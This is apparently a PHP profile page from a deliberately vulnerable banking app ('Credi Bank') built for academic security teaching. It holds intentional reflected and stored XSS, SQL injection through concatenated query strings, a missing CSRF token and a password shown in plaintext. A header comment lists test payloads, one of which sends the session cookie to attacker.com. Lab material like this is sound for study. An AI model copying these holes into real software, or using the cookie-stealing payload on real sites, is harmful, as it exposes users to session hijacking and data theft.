<?php
// ================================================
// CREDI BANK - Perfil de Usuario
// VULNERABILIDADES INTENCIONALES (Académico ULS):
//   [1] XSS Reflejado: campo búsqueda refleja input sin escapar
//   [2] XSS Almacenado: datos de perfil guardados sin sanitizar
//   [3] Robo de cookie de sesión posible con document.cookie
//   [4] Sin validación de tipo de datos
//
// Payloads de prueba:
//   <script>alert('XSS Reflejado')</script>
//   <script>alert(document.cookie)</script>
//   <img src=x onerror="alert('XSS Imagen')">
//   <script>document.location='http://attacker.com?c='+document.cookie</script>
// ================================================

require_once 'includes/db.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit;
}

$uid     = $_SESSION['user_id'];
$msg     = "";
$tipo_msg = "";

// Obtener datos actuales
$res  = mysqli_query($conn, "SELECT * FROM usuarios WHERE id = $uid");
$user = mysqli_fetch_assoc($res);

// Actualizar perfil
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'update') {
    $nombre    = $_POST['nombre']    ?? '';
    $email     = $_POST['email']     ?? '';
    $telefono  = $_POST['telefono']  ?? '';
    $direccion = $_POST['direccion'] ?? '';

    // ⚠️ VULNERABLE: Sin sanitización, XSS Almacenado posible
    $sql = "UPDATE usuarios SET
                nombre    = '$nombre',
                email     = '$email',
                telefono  = '$telefono',
                direccion = '$direccion'
            WHERE id = $uid";

    if (mysqli_query($conn, $sql)) {
        $_SESSION['nombre'] = $nombre;
        $msg      = "✅ Perfil actualizado correctamente.";
        $tipo_msg = "success";
        // Recargar datos
        $res  = mysqli_query($conn, "SELECT * FROM usuarios WHERE id = $uid");
        $user = mysqli_fetch_assoc($res);
    } else {
        $msg      = "Error: " . mysqli_error($conn);
        $tipo_msg = "danger";
    }
}

// XSS Reflejado - búsqueda de perfil
$busqueda_xss = $_GET['buscar'] ?? '';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Mi Perfil - Credi Bank</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>

<?php include 'includes/navbar.php'; ?>

<div class="container">
    <div class="layout">
        <?php include 'includes/sidebar.php'; ?>
        <div class="main-content">

            <h2 class="page-title">👤 Mi Perfil
        
            </h2>

            <!-- ⚠️ VULNERABLE: XSS REFLEJADO - el parámetro se imprime SIN escapar -->
            <?php if ($busqueda_xss !== ''): ?>
            <div class="alert alert-info">
                Resultados de búsqueda para: <?= $busqueda_xss /* ⚠️ Sin htmlspecialchars() */ ?>
            </div>
            <?php endif; ?>

            <div class="card">
                <h3>🔍 Búsqueda rápida
                
                </h3>
                <form method="GET">
                    <div style="display:flex;gap:10px;">
                        <div class="form-group" style="flex:1;margin:0;">
                            <input type="text" name="buscar"
                                   value="<?= htmlspecialchars($busqueda_xss) ?>"
                                   style="height:44px;">
                        </div>
                        <button type="submit" class="btn btn-primary" style="height:44px;">Buscar</button>
                    </div>
                </form>
                
            </div>

            <?php if ($msg): ?>
                <div class="alert alert-<?= $tipo_msg ?>"><?= $msg ?></div>
            <?php endif; ?>

            <div class="card">
                <h3>✏️ Editar Información Personal
                
                </h3>
                <!-- ⚠️ Sin token CSRF -->
                <form method="POST">
                    <input type="hidden" name="action" value="update">
                    <div class="grid-2">
                        <div class="form-group">
                            <label>Nombre completo</label>
                            <!-- ⚠️ El valor guardado se muestra SIN escapar (XSS Almacenado) -->
                            <input type="text" name="nombre"
                                   value="<?= $user['nombre'] /* ⚠️ Sin htmlspecialchars */ ?>">
                        </div>
                        <div class="form-group">
                            <label>Correo electrónico</label>
                            <input type="text" name="email"
                                   value="<?= $user['email'] ?>">
                        </div>
                        <div class="form-group">
                            <label>Teléfono</label>
                            <input type="text" name="telefono"
                                   value="<?= $user['telefono'] ?>">
                        </div>
                        <div class="form-group">
                            <label>Dirección</label>
                            <input type="text" name="direccion"
                                   value="<?= $user['direccion'] ?>">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary">💾 Guardar Cambios</button>
                </form>
            </div>

            <div class="card" style="background:#f8f9ff;">
                <h3>📋 Información de Cuenta</h3>
                <table>
                    <tr><td><strong>ID de usuario</strong></td><td><?= $user['id'] ?></td></tr>
                    <tr><td><strong>Username</strong></td><td><?= $user['username'] ?></td></tr>
                    <tr><td><strong>Rol</strong></td><td><?= $user['rol'] ?></td></tr>
                    <!-- ⚠️ La contraseña se muestra en texto plano -->
                    <tr><td><strong>Contraseña (texto plano ⚠️)</strong></td><td><code><?= $user['password'] ?></code></td></tr>
                    <tr><td><strong>Miembro desde</strong></td><td><?= date('d/m/Y', strtotime($user['fecha_creacion'])) ?></td></tr>
                </table>
            </div>

        </div>
    </div>
</div>

</body>
</html>
